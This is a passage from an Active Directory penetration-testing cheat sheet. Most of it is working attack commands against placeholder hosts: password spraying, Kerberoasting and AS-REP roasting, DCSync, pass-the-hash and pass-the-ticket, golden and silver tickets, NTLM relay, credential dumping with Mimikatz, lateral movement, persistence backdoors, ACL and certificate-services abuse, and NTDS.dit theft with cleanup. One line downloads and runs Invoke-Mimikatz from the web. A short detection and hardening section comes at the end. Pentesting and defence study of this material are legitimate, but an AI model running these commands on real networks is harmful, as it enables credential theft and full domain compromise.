crackmapexec smb dc01.corp.example.com -u 'jsmith' -p 'Password123' --pass-pol

# Enumerate logged on users
crackmapexec smb 10.0.0.0/24 -u 'jsmith' -p 'Password123' --loggedon-users

# Enumerate local admins
crackmapexec smb 10.0.0.0/24 -u 'jsmith' -p 'Password123' --local-auth

# Spider shares for sensitive files
crackmapexec smb dc01.corp.example.com -u 'jsmith' -p 'Password123' --spider C$ --pattern "password|credential|secret"

# ============ SMBCLIENT ============

# List shares
smbclient -L //dc01.corp.example.com -U 'jsmith%Password123'

# Connect to share
smbclient //dc01.corp.example.com/SYSVOL -U 'jsmith%Password123'

# ============ SMBMAP ============

# Enumerate shares and permissions
smbmap -H dc01.corp.example.com -u 'jsmith' -p 'Password123' -d 'corp.example.com'

# Recursive listing
smbmap -H dc01.corp.example.com -u 'jsmith' -p 'Password123' -r 'SYSVOL'

# ============ ENUM4LINUX ============

# Full enumeration
enum4linux -a dc01.corp.example.com -u 'jsmith' -p 'Password123'

# enum4linux-ng (modern version)
enum4linux-ng -A dc01.corp.example.com -u 'jsmith' -p 'Password123'

# ============ RPCCLIENT ============

# Connect
rpcclient -U 'jsmith%Password123' dc01.corp.example.com

# Inside rpcclient:
enumdomusers         # Enumerate users
enumdomgroups        # Enumerate groups
queryuser 0x1f4      # Query user by RID
querygroupmem 0x200  # Query group members (Domain Admins = 0x200)
enumprinters         # Enumerate printers
getdompwinfo         # Get password policy
```
::

---

## AD Attack Techniques

### Password Spraying

::code-preview
---
class: "[&>div]:*:my-0"
---
Password spraying against AD.

#code
```bash
# ============ CRACKMAPEXEC ============

# Single password spray
crackmapexec smb dc01.corp.example.com -u users.txt -p 'Summer2024!' -d 'corp.example.com'

# Multiple passwords (careful of lockout!)
crackmapexec smb dc01.corp.example.com -u users.txt -p passwords.txt -d 'corp.example.com' --no-bruteforce

# ============ KERBRUTE ============

# Password spray via Kerberos (faster, less detectable)
kerbrute passwordspray -d corp.example.com --dc dc01.corp.example.com users.txt 'Summer2024!'

# Enumerate valid usernames first
kerbrute userenum -d corp.example.com --dc dc01.corp.example.com users.txt

# Brute force single user
kerbrute bruteuser -d corp.example.com --dc dc01.corp.example.com passwords.txt jsmith

# ============ SPRAY (DomainPasswordSpray) ============

# PowerShell password spray
Import-Module .\DomainPasswordSpray.ps1

# Spray with single password
Invoke-DomainPasswordSpray -Password 'Summer2024!' -OutFile spray_results.txt

# With user list
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Summer2024!' -Domain corp.example.com

# ============ HYDRA ============

# SMB spray
hydra -L users.txt -p 'Summer2024!' smb://dc01.corp.example.com

# RDP spray
hydra -L users.txt -p 'Summer2024!' rdp://dc01.corp.example.com

# LDAP spray
hydra -L users.txt -p 'Summer2024!' ldap://dc01.corp.example.com
```
::

### Common Password Patterns for Spraying

| Pattern                  | Example                          |
| ------------------------ | -------------------------------- |
| Season + Year            | `Summer2024!`, `Winter2024!`     |
| Month + Year             | `January2024!`, `March2024!`     |
| Company + Number         | `Company123!`, `Corp2024!`       |
| Password + Number        | `Password1`, `Password123!`      |
| Welcome + Number         | `Welcome1!`, `Welcome2024!`      |
| City + Number            | `NewYork2024!`, `London123!`     |
| Day of Week              | `Monday1!`, `Friday123!`         |

### AS-REP Roasting

::code-preview
---
class: "[&>div]:*:my-0"
---
Attack accounts with Kerberos pre-authentication disabled.

#code
```bash
# ============ FROM LINUX (IMPACKET) ============

# Find and extract AS-REP hashes
impacket-GetNPUsers corp.example.com/ -dc-ip 10.0.0.1 -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# With credentials
impacket-GetNPUsers corp.example.com/jsmith:Password123 -dc-ip 10.0.0.1 -request -format hashcat -outputfile asrep_hashes.txt

# Without credentials (if null sessions allowed)
impacket-GetNPUsers corp.example.com/ -dc-ip 10.0.0.1 -no-pass -usersfile users.txt

# ============ FROM WINDOWS (RUBEUS) ============

# Find AS-REP Roastable users
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Target specific user
.\Rubeus.exe asreproast /user:svc_account /format:hashcat

# ============ CRACK THE HASHES ============

# Hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
::

### Kerberoasting

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract and crack service account tickets.

#code
```bash
# ============ FROM LINUX (IMPACKET) ============

# Request TGS tickets for all service accounts
impacket-GetUserSPNs corp.example.com/jsmith:Password123 -dc-ip 10.0.0.1 -request -outputfile kerberoast_hashes.txt

# Target specific SPN
impacket-GetUserSPNs corp.example.com/jsmith:Password123 -dc-ip 10.0.0.1 -request-user svc_sql

# With NTLM hash
impacket-GetUserSPNs corp.example.com/jsmith -hashes 'aad3b435b51404eeaad3b435b51404ee:hash' -dc-ip 10.0.0.1 -request

# ============ FROM WINDOWS (RUBEUS) ============

# Kerberoast all service accounts
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Target specific user
.\Rubeus.exe kerberoast /user:svc_sql /outfile:kerberoast_hashes.txt

# With password hash cracking format
.\Rubeus.exe kerberoast /format:hashcat

# ============ FROM WINDOWS (POWERVIEW) ============

# Find Kerberoastable users
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Request tickets
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File kerberoast_hashes.txt

# ============ CRACK THE HASHES ============

# Hashcat (mode 13100 for TGS-REP)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=krb5tgs kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
::

### DCSync Attack

::code-preview
---
class: "[&>div]:*:my-0"
---
Replicate AD data to extract credentials (requires DCSync rights).

#code
```bash
# ============ FROM LINUX (IMPACKET) ============

# Dump all domain hashes
impacket-secretsdump corp.example.com/admin:Password123@dc01.corp.example.com

# Dump specific user hash
impacket-secretsdump corp.example.com/admin:Password123@dc01.corp.example.com -just-dc-user krbtgt

# Dump with NTLM hash
impacket-secretsdump corp.example.com/admin@dc01.corp.example.com -hashes 'aad3b435b51404eeaad3b435b51404ee:hash'

# Using Kerberos ticket
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass dc01.corp.example.com

# Dump only NTLM hashes (no Kerberos keys)
impacket-secretsdump corp.example.com/admin:Password123@dc01.corp.example.com -just-dc-ntlm

# ============ FROM WINDOWS (MIMIKATZ) ============

# DCSync specific user
mimikatz# lsadump::dcsync /domain:corp.example.com /user:krbtgt
mimikatz# lsadump::dcsync /domain:corp.example.com /user:Administrator

# DCSync all users
mimikatz# lsadump::dcsync /domain:corp.example.com /all /csv

# ============ CHECK WHO HAS DCSYNC RIGHTS ============

# PowerView
Get-DomainObjectAcl -SearchBase "DC=corp,DC=example,DC=com" -SearchScope Base | Where-Object {
    ($_.ObjectAceType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2") -or  # DS-Replication-Get-Changes
    ($_.ObjectAceType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") -or  # DS-Replication-Get-Changes-All
    ($_.ObjectAceType -eq "89e95b76-444d-4c62-991a-0facbeda640c")      # DS-Replication-Get-Changes-In-Filtered-Set
} | Select-Object SecurityIdentifier, ObjectAceType
```
::

### Pass-the-Hash (PtH)

::code-preview
---
class: "[&>div]:*:my-0"
---
Authenticate using NTLM hash without password.

#code
```bash
# ============ FROM LINUX ============

# Impacket - psexec
impacket-psexec corp.example.com/Administrator@10.0.0.1 -hashes 'aad3b435b51404eeaad3b435b51404ee:ntlmhash'

# Impacket - wmiexec
impacket-wmiexec corp.example.com/Administrator@10.0.0.1 -hashes 'aad3b435b51404eeaad3b435b51404ee:ntlmhash'

# Impacket - smbexec
impacket-smbexec corp.example.com/Administrator@10.0.0.1 -hashes 'aad3b435b51404eeaad3b435b51404ee:ntlmhash'

# Impacket - atexec
impacket-atexec corp.example.com/Administrator@10.0.0.1 -hashes 'aad3b435b51404eeaad3b435b51404ee:ntlmhash' "whoami"

# CrackMapExec
crackmapexec smb 10.0.0.0/24 -u 'Administrator' -H 'ntlmhash' -d 'corp.example.com'
crackmapexec smb 10.0.0.1 -u 'Administrator' -H 'ntlmhash' --exec-method smbexec -x 'whoami'

# Evil-WinRM
evil-winrm -i 10.0.0.1 -u Administrator -H 'ntlmhash'

# xfreerdp (RDP)
xfreerdp /v:10.0.0.1 /u:Administrator /pth:'ntlmhash'

# ============ FROM WINDOWS (MIMIKATZ) ============

# Pass the Hash
mimikatz# sekurlsa::pth /user:Administrator /domain:corp.example.com /ntlm:ntlmhash /run:cmd.exe

# This opens a new cmd.exe with the target's credentials
```
::

### Pass-the-Ticket (PtT)

::code-preview
---
class: "[&>div]:*:my-0"
---
Use stolen Kerberos tickets.

#code
```powershell
# ============ FROM WINDOWS (RUBEUS) ============

# Harvest tickets
.\Rubeus.exe triage
.\Rubeus.exe dump

# Monitor for new tickets
.\Rubeus.exe monitor /interval:30

# Pass the ticket
.\Rubeus.exe ptt /ticket:base64_ticket_here

# Create sacrifice process with ticket
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.example.com /username:admin /password:fake /ticket:base64_ticket

# ============ FROM WINDOWS (MIMIKATZ) ============

# Export all tickets
mimikatz# sekurlsa::tickets /export

# List tickets
mimikatz# kerberos::list

# Pass the ticket
mimikatz# kerberos::ptt ticket.kirbi

# ============ FROM LINUX ============

# Convert ticket format
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi

# Use the ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass dc01.corp.example.com
impacket-smbexec -k -no-pass dc01.corp.example.com
impacket-wmiexec -k -no-pass dc01.corp.example.com
```
::

### Golden Ticket Attack

::code-preview
---
class: "[&>div]:*:my-0"
---
Forge a TGT for complete domain access.

#code
```bash
# Requirements:
# - Domain SID
# - krbtgt NTLM hash
# - Domain name

# ============ STEP 1: Get krbtgt hash ============

# Via DCSync
impacket-secretsdump corp.example.com/admin:Password123@dc01.corp.example.com -just-dc-user krbtgt

# Via Mimikatz
mimikatz# lsadump::dcsync /domain:corp.example.com /user:krbtgt

# ============ STEP 2: Get Domain SID ============

# PowerShell
(Get-ADDomain).DomainSID
# Or
whoami /user  # User SID minus the last part (RID)

# ============ STEP 3: Create Golden Ticket ============

# Mimikatz
mimikatz# kerberos::golden /user:Administrator /domain:corp.example.com /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:krbtgt_ntlm_hash /ptt

# With specific groups
mimikatz# kerberos::golden /user:fakeadmin /domain:corp.example.com /sid:S-1-5-21-XXX /krbtgt:hash /groups:512,513,518,519,520 /ptt

# Impacket
impacket-ticketer -nthash krbtgt_ntlm_hash -domain-sid S-1-5-21-XXX -domain corp.example.com Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass dc01.corp.example.com
impacket-smbexec -k -no-pass dc01.corp.example.com

# ============ STEP 4: Use Golden Ticket ============

# Mimikatz (already loaded with /ptt)
# Open new cmd.exe or access any resource in the domain
dir \\dc01.corp.example.com\C$
klist  # Verify ticket
```
::

### Silver Ticket Attack

::code-preview
---
class: "[&>div]:*:my-0"
---
Forge a service ticket for specific service access.

#code
```bash
# Requirements:
# - Domain SID
# - Service account NTLM hash
# - Service SPN
# - Domain name

# ============ CREATE SILVER TICKET ============

# Mimikatz - CIFS (file share access)
mimikatz# kerberos::golden /user:Administrator /domain:corp.example.com /sid:S-1-5-21-XXX /target:fileserver.corp.example.com /service:cifs /rc4:service_ntlm_hash /ptt

# Silver Ticket for different services
# CIFS  - File share access
# HTTP  - Web application access
# HOST  - WMI, scheduled tasks
# MSSQL - Database access
# LDAP  - LDAP operations
# RPCSS - WMI

# Impacket
impacket-ticketer -nthash service_ntlm_hash -domain-sid S-1-5-21-XXX -domain corp.example.com -spn cifs/fileserver.corp.example.com Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
smbclient -k //fileserver.corp.example.com/share
```
::

### NTLM Relay

::code-preview
---
class: "[&>div]:*:my-0"
---
Relay NTLM authentication to other services.

#code
```bash
# ============ STEP 1: Find targets without SMB signing ============

# CrackMapExec
crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# Nmap
nmap --script smb2-security-mode -p 445 10.0.0.0/24

# ============ STEP 2: Start Relay ============

# ntlmrelayx - Relay to SMB
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Relay and execute command
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami"

# Relay and dump SAM
impacket-ntlmrelayx -tf relay_targets.txt -smb2support --dump

# Relay to LDAP (for creating machine accounts, ACL abuse)
impacket-ntlmrelayx -t ldap://dc01.corp.example.com --escalate-user jsmith

# Relay to LDAPS
impacket-ntlmrelayx -t ldaps://dc01.corp.example.com --add-computer

# ============ STEP 3: Trigger Authentication ============

# Responder (capture and relay)
sudo responder -I eth0 -dwP

# PetitPotam (coerce DC authentication)
python3 PetitPotam.py listener_ip dc01.corp.example.com

# PrinterBug / SpoolSample
python3 printerbug.py corp.example.com/jsmith:Password123@dc01.corp.example.com listener_ip

# Coercer (all coercion techniques)
python3 coercer.py -u jsmith -p Password123 -d corp.example.com -l listener_ip -t dc01.corp.example.com
```
::

### Credential Dumping

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract credentials from compromised systems.

#code
```powershell
# ============ MIMIKATZ ============

# Dump logged-on user credentials
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Dump SAM database
mimikatz# lsadump::sam

# Dump LSA secrets
mimikatz# lsadump::secrets

# Dump cached domain credentials
mimikatz# lsadump::cache

# Dump DPAPI master keys
mimikatz# sekurlsa::dpapi

# Dump tickets
mimikatz# sekurlsa::tickets /export

# DCSync
mimikatz# lsadump::dcsync /domain:corp.example.com /all /csv

# ============ IMPACKET (FROM LINUX) ============

# Remote credential dump
impacket-secretsdump corp.example.com/admin:Password123@10.0.0.1

# Dump SAM/LSA/NTDS
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Dump NTDS.dit offline
impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

# ============ CRACKMAPEXEC ============

# Dump SAM
crackmapexec smb 10.0.0.1 -u admin -p Password123 --sam

# Dump LSA
crackmapexec smb 10.0.0.1 -u admin -p Password123 --lsa

# Dump NTDS.dit
crackmapexec smb dc01.corp.example.com -u admin -p Password123 --ntds

# Dump LAPS passwords
crackmapexec smb 10.0.0.1 -u admin -p Password123 --laps

# ============ OTHER TOOLS ============

# LaZagne - Credential recovery
lazagne.exe all

# SharpLAPS - Read LAPS passwords
.\SharpLAPS.exe /user:admin /pass:Password123 /host:dc01.corp.example.com

# Invoke-Mimikatz (PowerShell)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```
::

### Lateral Movement

::code-preview
---
class: "[&>div]:*:my-0"
---
Move laterally across the domain.

#code
```bash
# ============ PSEXEC ============

# Impacket
impacket-psexec corp.example.com/admin:Password123@10.0.0.1
impacket-psexec corp.example.com/admin@10.0.0.1 -hashes 'hash'

# Sysinternals PsExec
PsExec.exe \\10.0.0.1 -u corp\admin -p Password123 cmd.exe
PsExec.exe \\10.0.0.1 -accepteula -s cmd.exe  # As SYSTEM

# ============ WMIEXEC ============

impacket-wmiexec corp.example.com/admin:Password123@10.0.0.1

# ============ SMBEXEC ============

impacket-smbexec corp.example.com/admin:Password123@10.0.0.1

# ============ EVIL-WINRM ============

evil-winrm -i 10.0.0.1 -u admin -p Password123
evil-winrm -i 10.0.0.1 -u admin -H 'ntlmhash'

# ============ POWERSHELL REMOTING ============

# Enter interactive session
Enter-PSSession -ComputerName TARGET01 -Credential corp\admin

# Execute command remotely
Invoke-Command -ComputerName TARGET01 -ScriptBlock { whoami } -Credential corp\admin

# Execute on multiple machines
Invoke-Command -ComputerName TARGET01,TARGET02,TARGET03 -ScriptBlock { hostname; whoami } -Credential corp\admin

# ============ RDP ============

# Linux
xfreerdp /v:10.0.0.1 /u:admin /p:Password123 /d:corp.example.com
xfreerdp /v:10.0.0.1 /u:admin /pth:ntlmhash

# Enable RDP remotely
crackmapexec smb 10.0.0.1 -u admin -p Password123 -M rdp -o ACTION=enable

# ============ DCOM ============

impacket-dcomexec corp.example.com/admin:Password123@10.0.0.1

# ============ SCHEDULED TASKS ============

# Create remote scheduled task
schtasks /create /s 10.0.0.1 /tn "Maintenance" /tr "cmd /c whoami > C:\temp\output.txt" /sc once /st 00:00 /ru SYSTEM /u admin /p Password123
schtasks /run /s 10.0.0.1 /tn "Maintenance" /u admin /p Password123
schtasks /delete /s 10.0.0.1 /tn "Maintenance" /f /u admin /p Password123

# ============ WMI ============

wmic /node:10.0.0.1 /user:admin /password:Password123 process call create "cmd /c whoami > C:\temp\output.txt"

# ============ SC (SERVICE CONTROL) ============

# Create remote service
sc \\10.0.0.1 create RemoteSvc binPath= "cmd /c whoami > C:\temp\output.txt"
sc \\10.0.0.1 start RemoteSvc
sc \\10.0.0.1 delete RemoteSvc
```
::

### Persistence Techniques

::code-preview
---
class: "[&>div]:*:my-0"
---
Maintain access in AD environment.

#code
```bash
# ============ GOLDEN TICKET ============
# (See Golden Ticket section above)

# ============ SILVER TICKET ============
# (See Silver Ticket section above)

# ============ SKELETON KEY ============

# Inject into LSASS on DC (password becomes "mimikatz" for all accounts)
mimikatz# privilege::debug
mimikatz# misc::skeleton

# Now any user can authenticate with "mimikatz" as password
# Original passwords still work too

# ============ DCSHADOW ============

# Register rogue DC and push changes
mimikatz# lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512

# Push changes
mimikatz# lsadump::dcshadow /push

# ============ ADMINSDH0LDER ABUSE ============

# Add user to AdminSDHolder ACL
# This propagates to all protected groups every 60 minutes

# PowerView
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=example,DC=com" -PrincipalIdentity "jsmith" -Rights All

# ============ SID HISTORY ============

# Add Enterprise Admin SID to user's SID history
mimikatz# sid::add /sam:jsmith /new:S-1-5-21-XXX-519

# ============ CUSTOM SSP ============

# Register malicious Security Support Provider
mimikatz# misc::memssp
# Credentials logged to C:\Windows\System32\mimilsa.log

# ============ GPO PERSISTENCE ============

# Create GPO with scheduled task for persistence
New-GPO -Name "System Maintenance" | New-GPLink -Target "OU=Workstations,DC=corp,DC=example,DC=com"

# ============ MACHINE ACCOUNT QUOTA ============

# Create machine account (default quota = 10)
impacket-addcomputer corp.example.com/jsmith:Password123 -computer-name 'FAKEMACHINE$' -computer-pass 'Password123'
```
::

### ACL Abuse

::code-preview
---
class: "[&>div]:*:my-0"
---
Exploit misconfigured ACLs for privilege escalation.

#code
```powershell
# ============ FIND ABUSABLE ACLS ============

# PowerView - Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -notmatch "Domain Admins|Enterprise Admins|SYSTEM|Administrators"
}

# Check ACLs on Domain Admins group
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner" }

# ============ GENERICALL ON USER ============

# Reset user's password
Set-ADAccountPassword -Identity targetuser -Reset -NewPassword (ConvertTo-SecureString "NewP@ss!" -AsPlainText -Force)

# Or with net command
net user targetuser NewP@ss! /domain

# ============ GENERICWRITE ON USER ============

# Set SPN for Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/service'}

# Then Kerberoast
.\Rubeus.exe kerberoast /user:targetuser

# ============ WRITEPROPERTY ON GROUP ============

# Add yourself to the group
Add-DomainGroupMember -Identity "Domain Admins" -Members "jsmith"

# Or with net
net group "Domain Admins" jsmith /add /domain

# ============ WRITEDACL ============

# Grant yourself DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=example,DC=com" -PrincipalIdentity jsmith -Rights DCSync

# Then DCSync
impacket-secretsdump corp.example.com/jsmith:Password123@dc01.corp.example.com

# ============ WRITEOWNER ============

# Take ownership of an object
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity jsmith

# Then grant yourself WriteDACL
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity jsmith -Rights All

# ============ FORCED PASSWORD CHANGE ============

# If you have "Reset Password" rights
$newPassword = ConvertTo-SecureString "NewP@ss!" -AsPlainText -Force
Set-ADAccountPassword -Identity targetuser -Reset -NewPassword $newPassword

# ============ SHADOW CREDENTIALS ============

# If you have write access to msDS-KeyCredentialLink
# Using Whisker
.\Whisker.exe add /target:targetuser

# From Linux
python3 pywhisker.py -d corp.example.com -u jsmith -p Password123 --target targetuser --action add
```
::

### Abusable AD Rights Reference

| ACL Right            | Abuse Technique                                      |
| -------------------- | ---------------------------------------------------- |
| `GenericAll`         | Full control — reset password, modify group, DCSync   |
| `GenericWrite`       | Modify attributes — set SPN, logon script            |
| `WriteProperty`      | Write specific properties — add to group             |
| `WriteDACL`          | Modify ACL — grant yourself more rights              |
| `WriteOwner`         | Change object owner — then modify DACL               |
| `ForceChangePassword`| Reset user's password without knowing current        |
| `Self`               | Add yourself to a group                              |
| `AllExtendedRights`  | Force change password, read LAPS, etc.               |
| `DS-Replication-Get-Changes` + `All` | DCSync — replicate all password hashes |

---

## AD Certificate Services (ADCS) Attacks

::code-preview
---
class: "[&>div]:*:my-0"
---
Attack misconfigured certificate templates (ESC1-ESC8).

#code
```bash
# ============ ENUMERATE VULNERABLE TEMPLATES ============

# Certipy (from Linux)
certipy find -u jsmith@corp.example.com -p Password123 -dc-ip 10.0.0.1 -vulnerable

# Certify (from Windows)
.\Certify.exe find /vulnerable

# ============ ESC1 - Misconfigured Certificate Template ============
# Template allows SAN (Subject Alternative Name) and low-priv enrollment

# Request certificate as another user
certipy req -u jsmith@corp.example.com -p Password123 -ca 'corp-CA' -template 'VulnerableTemplate' -upn administrator@corp.example.com

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# ============ ESC4 - Template ACL Abuse ============

# Modify vulnerable template
certipy template -u jsmith@corp.example.com -p Password123 -template VulnerableTemplate -save-old

# ============ ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ============

# CA allows arbitrary SAN in requests
certipy req -u jsmith@corp.example.com -p Password123 -ca 'corp-CA' -template User -upn administrator@corp.example.com

# ============ ESC8 - NTLM Relay to AD CS Web Enrollment ============

# Setup relay to CA web enrollment
impacket-ntlmrelayx -t http://ca.corp.example.com/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication
python3 PetitPotam.py listener_ip dc01.corp.example.com

# Use the certificate
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
```
::

---

## Post-Exploitation

### NTDS.dit Extraction

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract the AD database for offline cracking.

#code
```bash
# ============ VOLUME SHADOW COPY ============

# Create shadow copy
wmic shadowcopy call create Volume='C:\'

# List shadow copies
vssadmin list shadows

# Copy NTDS.dit and SYSTEM hive
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# ============ NTDSUTIL ============

ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds_dump" quit quit

# ============ SECRETSDUMP OFFLINE ============

impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL -outputfile domain_hashes

# ============ CRACKMAPEXEC ============

crackmapexec smb dc01.corp.example.com -u admin -p Password123 --ntds

# ============ CLEANUP ============

# Delete shadow copies
vssadmin delete shadows /all /quiet
```
::

### Domain Dominance Checklist

| Technique                     | Description                                    | Access Level Required    |
| ----------------------------- | ---------------------------------------------- | ------------------------ |
| DCSync                        | Replicate all hashes from AD                   | Domain Admin / DCSync    |
| Golden Ticket                 | Forge TGT for any user                         | krbtgt hash              |
| Silver Ticket                 | Forge service ticket                           | Service account hash     |
| Skeleton Key                  | Backdoor LSASS on DC                           | Domain Admin             |
| DCShadow                      | Register rogue DC, push malicious changes      | Domain Admin             |
| AdminSDHolder                 | Persistent admin access via SDProp              | Domain Admin             |
| SID History                   | Add privileged SID to user                     | Domain Admin             |
| GPO Abuse                     | Deploy persistence via Group Policy            | GPO Creator Owner        |
| ADCS Abuse                    | Forge certificates for authentication          | Enrollment rights         |
| Custom SSP                    | Log all passwords via custom SSP               | Domain Admin             |

---

## AD Defense and Detection

### Detection Matrix

| Attack                  | Event IDs                        | Log Source                |
| ----------------------- | -------------------------------- | ------------------------- |
| Password Spray          | 4625 (many), 4771                | Security Log              |
| Kerberoasting           | 4769 (TGS request, RC4)         | Security Log              |
| AS-REP Roasting         | 4768 (without pre-auth)         | Security Log              |
| DCSync                  | 4662 (replication)              | Security Log              |
| Golden Ticket           | 4769 (TGS with forged TGT)     | Security Log              |
| Pass-the-Hash           | 4624 (Type 3, NTLM)            | Security Log              |
| Pass-the-Ticket         | 4768/4769 (anomalous)           | Security Log              |
| Skeleton Key            | 7045 (new service)              | System Log                |
| NTLM Relay              | 4624 (Type 3, NTLM)            | Security Log              |
| Lateral Movement (PSExec)| 4624 (Type 3), 7045            | Security + System Log     |
| Account Manipulation    | 4720, 4728, 4732, 4756         | Security Log              |
| GPO Modification        | 5136, 5137                      | Security Log              |
| Certificate Abuse       | 4886, 4887                      | AD CS Log                 |

### Hardening Recommendations

::code-preview
---
class: "[&>div]:*:my-0"
---
Key AD hardening measures.

#code
```powershell
# ============ KERBEROS HARDENING ============

# Disable RC4 encryption (forces AES)
# GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# Network security: Configure encryption types allowed for Kerberos
# Enable: AES128, AES256 only

# Enable Kerberos Armoring (FAST)
# GPO: Computer Configuration > Policies > Administrative Templates > System > KDC
# KDC support for claims, compound authentication and Kerberos armoring: Enabled

# ============ CREDENTIAL PROTECTION ============

# Enable Protected Users group (add privileged accounts)
Add-ADGroupMember -Identity "Protected Users" -Members "admin1", "admin2"

# Enable Credential Guard
# GPO: Computer Configuration > Administrative Templates > System > Device Guard
# Turn On Virtualization Based Security: Enabled
# Credential Guard Configuration: Enabled with UEFI lock

# Disable NTLM (if possible)
# GPO: Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
# Network security: Restrict NTLM: Incoming NTLM traffic: Deny all
# Network security: Restrict NTLM: NTLM authentication in this domain: Deny all

# ============ PRIVILEGED ACCESS ============

# Implement tiered admin model
# Tier 0: Domain Controllers, AD infrastructure
# Tier 1: Member servers, applications
# Tier 2: Workstations, end-user devices

# Configure AdminSDHolder protection interval
# Default: 60 minutes
# Reg: HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
# AdminSDProtectFrequency = 600 (10 minutes, more aggressive)

# ============ AUDITING ============

# Enable advanced audit policies
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Account Management" /success:enable /failure:enable

# Enable command line logging
# GPO: Computer Configuration > Administrative Templates > System > Audit Process Creation
# Include command line in process creation events: Enabled

# ============ PASSWORD POLICY ============

# Set strong password policy
Set-ADDefaultDomainPasswordPolicy -Identity corp.example.com `
    -MinPasswordLength 14 `
    -PasswordHistoryCount 24 `
    -MaxPasswordAge "90.00:00:00" `
    -MinPasswordAge "1.00:00:00" `
    -ComplexityEnabled $true `
    -LockoutThreshold 5 `
    -LockoutDuration "00:30:00" `
    -LockoutObservationWindow "00:30:00" `
    -ReversibleEncryptionEnabled $false

# ============ LAPS (Local Administrator Password Solution) ============

# Install LAPS
# Import-Module AdmPwd.PS
# Update-AdmPwdADSchema
# Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Workstations,DC=corp,DC=example,DC=com"

# ============ ADCS HARDENING ============

# Remove dangerous template settings
# - Disable EDITF_ATTRIBUTESUBJECTALTNAME2
# - Remove "Supply in request" from SAN
# - Restrict enrollment permissions
# - Use manager approval for sensitive templates

# ============ NETWORK SEGMENTATION ============

# Restrict DC communication to required ports only
# Implement PAW (Privileged Access Workstations)
# Deploy jump servers for admin access
```
::

---

## Essential AD Pentesting Tools

| Tool                    | Category           | Purpose                                          |
| ----------------------- | ------------------ | ------------------------------------------------ |
| **BloodHound**          | Enumeration        | AD relationship mapping and attack path analysis |
| **SharpHound**          | Enumeration        | BloodHound data collector (C#)                   |
| **PowerView**           | Enumeration        | PowerShell AD enumeration                        |
| **Mimikatz**            | Credential         | Credential extraction and ticket forging         |
| **Rubeus**              | Kerberos           | Kerberos abuse toolkit (C#)                      |
| **Impacket**            | Multi-purpose      | Python tools for AD attacks                      |
| **CrackMapExec**        | Multi-purpose      | Swiss army knife for AD pentesting               |
| **Evil-WinRM**          | Lateral Movement   | WinRM shell                                      |
| **Kerbrute**            | Password           | Kerberos brute forcing and user enumeration      |
| **Certipy**             | ADCS               | AD Certificate Services attacks                  |
